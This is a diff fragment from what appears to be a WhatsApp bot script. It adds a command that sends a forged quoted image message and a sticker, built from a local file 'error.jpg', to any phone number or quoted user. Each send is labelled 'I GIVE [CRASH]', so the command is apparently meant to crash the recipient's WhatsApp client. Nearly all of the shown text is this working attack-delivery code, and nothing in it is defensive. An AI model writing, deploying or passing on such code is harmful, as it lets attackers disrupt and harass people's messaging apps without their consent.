+     hisoka.sendImageAsSticker(text, c, pek, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+} else if(text.startsWith("@")) {
+    a = await hisoka.sendMessage(m.chat, {text: "Succes Mengirim"})
+    c = fs.readFileSync('./error.jpg')
+    pek = { 
+        key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        }, 
+        message: { 
+            "imageMessage": { 
+                "mimetype": "image/jpeg", 
+                "caption": `pe`, 
+                "jpegThumbnail": c
+            } 
+        } 
+    }
+    hisoka.sendMessage(`${text.split("@")[1]}@s.whatsapp.net`, {text: "HANZ々OFC彡I GIVE [CRASH]"}, {quoted:pek})
+    hisoka.sendImageAsSticker(`${text.split("@")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+} else if(text.includes("+")) {
+    a = await hisoka.sendMessage(m.chat, {text: "Succes Mengirim"})
+   c = fs.readFileSync('error.jpg')
+   pek = { 
+        key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: ""}) 
+        }, 
+        message: { 
+            "imageMessage": { 
+                "mimetype": "image/jpeg", 
+                "caption": `pe`, 
+                "jpegThumbnail": c
+            } 
+        } 
+    }
+    hisoka.sendMessage(`${text.split("+")[1]}@s.whatsapp.net`, {text: "HANZ々OFC彡I GIVE [CRASH]"}, {quoted:pek})
+    hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, pek, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+} else if(isQuoted) {
+    a = await hisoka.sendMessage(m.chat, {text: "Succes Mengirim"})
+    c = fs.readFileSync('error.jpg')
+     pek = { 
+        key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: ""}) 
+        }, 
+        message: { 
+            "imageMessage": { 
+                "mimetype": "image/jpeg", 
+                "caption": `pe`, 
+                "jpegThumbnail": c
+            } 
+        } 
+    }
+    hisoka.sendMessage(quoted.sender, {text: "HANZ々OFC彡I GIVE [CRASH]"}, {quoted:pek})
+    hisoka.sendImageAsSticker(quoted.sender, c, pek, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
+} else {
+        m.reply("Dibutuhkan id Room")
+        }
+} catch (e) {
+        m.reply("error")
+        }
+}
+break
             default:
                 if (budy.startsWith('=>')) {
                     if (!isCreator) return m.reply(mess.owner)
